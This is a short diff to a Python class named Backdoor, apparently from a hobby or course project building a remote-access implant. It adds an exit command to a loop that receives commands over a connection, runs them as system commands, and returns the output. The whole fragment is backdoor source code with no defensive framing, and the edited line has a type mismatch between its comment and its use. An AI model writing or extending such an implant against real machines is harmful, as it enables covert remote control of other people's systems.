@@ -32,7 +32,10 @@ class Backdoor:
 
     def run(self):
         while True:
-            command = self.reliable_receive()  # bytes
+            command = self.reliable_receive()  # str
+            if command[0] == 'exit':
+                self.connection.close()
+                exit()
             command_result = self.execute_system_command(command)  # bytes
             command_result = command_result.decode(errors='replace')  # str
             self.reliable_send(command_result)
